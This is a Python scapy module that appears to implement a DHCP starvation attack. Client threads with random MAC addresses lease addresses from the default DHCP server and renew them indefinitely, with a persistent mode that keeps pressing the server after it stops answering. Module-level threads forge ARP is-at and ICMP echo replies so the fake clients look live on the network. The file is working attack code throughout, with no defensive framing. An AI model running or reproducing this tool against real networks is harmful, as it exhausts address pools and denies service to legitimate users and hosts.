import os
import sys
from random import randint
from threading import Thread
from time import sleep

from scapy.arch import str2mac
from scapy.config import conf
from scapy.layers.dhcp import DHCP, BOOTP
from scapy.layers.inet import IP, ICMP, UDP
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import sr1, sendp, sniff, srp1, send
from scapy.utils import mac2str
from scapy.volatile import RandMAC

OFFER = 2
ACK = 5
NAK = 6

TIMEOUT = 1


class Client(Thread):
    iface = conf.iface  # default interface
    target = conf.route.route("0.0.0.0")[2]  # default DHCP server
    target_mac = None
    lock = None
    persist = False
    addresses = {}  # all the address we have

    def __init__(self):
        Thread.__init__(self)
        # generate random mac address
        self.ch_mac = mac2str(str(RandMAC()))
        self.mac = str2mac(self.ch_mac)
        self.transaction_id = randint(0, 0xffffffff)
        self.ip = None

    def run(self):
        """
        Discover -> Offer -> Request -> ACK
        According to RFC 2131 (DHCPv4),
        after receiving an ack packet the client should wait for 50% of the lease time before sending a new request.
        If the client does not receive a response from the server,
        the next request from the client should be after 88.5% of the lease time.
        """
        self.discover()
        offer_packet = self.sniffer(OFFER)

        if not offer_packet:
            return  # if timeout occurs stop the current thread

        self.replace_ip(offer_packet[BOOTP].yiaddr)  # check if we get different ip address

        self.request()
        ack_packet = self.sniffer(ACK)
        if not ack_packet:
            self.kill_thread()

        self.replace_ip(offer_packet[BOOTP].yiaddr)  # check if we get different ip address

        time_for_release = ack_packet[DHCP].lease_time
        # every loop we renew the same ip address
        while True:  # renew the lease infinite times
            sleep(time_for_release * 0.5)  # wait for 50% of the lease time
            self.request()
            ack_packet = self.sniffer(ACK)
            if ack_packet:  # receive ack packet successfully
                time_for_release = ack_packet[DHCP].lease_time
                self.replace_ip(offer_packet[BOOTP].yiaddr)  # check if we get different ip address
                continue  # renew the lease
            else:  # not receiving ack
                sleep(time_for_release * (0.885 - 0.5))  # wait for 88.5% of the lease time
                self.request()
                ack_packet = self.sniffer(ACK)
                if not ack_packet:  # if not receive ack packet
                    self.kill_thread()
                time_for_release = ack_packet[DHCP].lease_time

    def sniffer(self, op):

        packets = sniff(
            count=1,
            iface=Client.iface,
            timeout=TIMEOUT,
            lfilter=lambda p:
            BOOTP in p and
            p[IP].src == Client.target and  # accept packets only from the target DHCP server
            # the packet is from server (OFFER, ACK or NAC)
            p[BOOTP].xid == self.transaction_id and  # the packet is for the current client
            dict([ops for ops in p[DHCP].options if len(ops) == 2])['message-type'] in [op, NAK],
        )

        if len(packets) == 0 or dict(
                [ops for ops in packets[0][DHCP].options if len(ops) == 2]
        )['message-type'] == NAK:  # if timeout occurs or we receive NAC
            if not Client.persist:
                # if not persistent the program terminated when the server is down
                os._exit(0)
            # all the threads that not receive answer while its lock are going to be killed
            elif Client.lock.acquire(blocking=True, timeout=TIMEOUT):
                # stop create clients, DHCP server is down
                print('========= LOCK Locked =========')
                sleep(TIMEOUT * 100)  # try again after TIMEOUT * 100 seconds (if real client disconnect)
                Client.lock.release()
                print('========= LOCK Release =========')
                return False
            else:  # if the lock is acquired that's mean that we send too many requests
                # close current thread
                self.kill_thread()

        else:  # successfully receive the packet
            print(f'{"A" if op == 5 else "O"}: 0x{self.transaction_id:08x}')
            return packets[0]

    def replace_ip(self, new_ip):
        """
        If we receive different ip, set self.ip and update the ips
        :param new_ip: the new ip address
        """
        if new_ip == self.ip:
            return
        if self.ip in Client.addresses: del Client.addresses[self.ip]
        self.ip = new_ip
        Client.addresses[new_ip] = self.mac

    def kill_thread(self):
        """
        It deletes the client's IP address from the dictionary of addresses
         and exits the thread
        """
        if self.ip in Client.addresses:
            del Client.addresses[self.ip]
        sys.exit()

    def discover(self):
        print(f'D: 0x{self.transaction_id:08x}')
        packet = Ether(
            src=self.mac,
            dst='ff:ff:ff:ff:ff:ff'
        ) / IP(
            src='0.0.0.0', dst='255.255.255.255'
        ) / UDP(
            dport=67, sport=68
        ) / BOOTP(
            op=1, chaddr=self.ch_mac, xid=self.transaction_id
        ) / DHCP(
            options=[('message-type', 'discover'),
                     'end']
        )
        Thread(target=self.sleep_and_send, args=packet).start()

    def sleep_and_send(self, packet):
        sleep(0.25)
        sendp(packet, iface=Client.iface, verbose=0)

    def request(self):
        print(f'R: 0x{self.transaction_id:08x}')
        packet = Ether(
            src=self.mac,
            dst='ff:ff:ff:ff:ff:ff'
        ) / IP(
            src='0.0.0.0', dst='255.255.255.255'
        ) / UDP(
            dport=67, sport=68
        ) / BOOTP(
            op=3, chaddr=self.ch_mac, xid=self.transaction_id
        ) / DHCP(
            options=[('message-type', 'request'),
                     ("server_id", Client.target),
                     ('requested_addr', self.ip),
                     'end']
        )
        Thread(target=self.sleep_and_send, args=packet).start()


def arp_is_at():
    """
    It listens for ARP who-has packets, and responds with ARP is-at packets
    """
    sniff(
        iface=Client.iface,
        lfilter=lambda p:
        ARP in p and
        p[ARP].op == 1 and  # its arp who-as type
        p[ARP].pdst in Client.addresses,  # the packet is for one of the clients
        prn=lambda p:
        # send arp is-at
        sendp(
            Ether(
                src=Client.addresses[p[ARP].pdst],
                dst=p[Ether].src
            ) / ARP(
                op=2,  # is-at
                hwsrc=Client.addresses[p[ARP].pdst],
                hwdst=p[Ether].src,
                psrc=p[ARP].pdst,
                pdst=p[ARP].psrc,
            ),
            verbose=0,
            iface=Client.iface
        ),
    )


def icmp_reply():
    """
    It listens for ICMP echo requests (ping) and sends ICMP echo replies (pong) to the source
    """
    sniff(
        iface=Client.iface,
        lfilter=lambda p:
        ICMP in p and  # its icmp packet
        p[IP].dst in Client.addresses and  # the packet is for one of the clients
        p[ICMP].type == 8,  # its icmp echo request
        prn=lambda p:
        # send icmp echo reply
        sendp(
            Ether(
                dst=p[Ether].src,
                src=Client.addresses[p[IP].dst]
            ) / IP(
                dst=p[IP].src,
                src=p[IP].dst
            ) / ICMP(
                type=0,
            ),
            iface=Client.iface,
            verbose=0
        )

    )


Thread(target=arp_is_at).start()  # run thread to answer all of arp request send to our ips
Thread(target=icmp_reply).start()  # run thread to answer all of icmp pings send to our ips
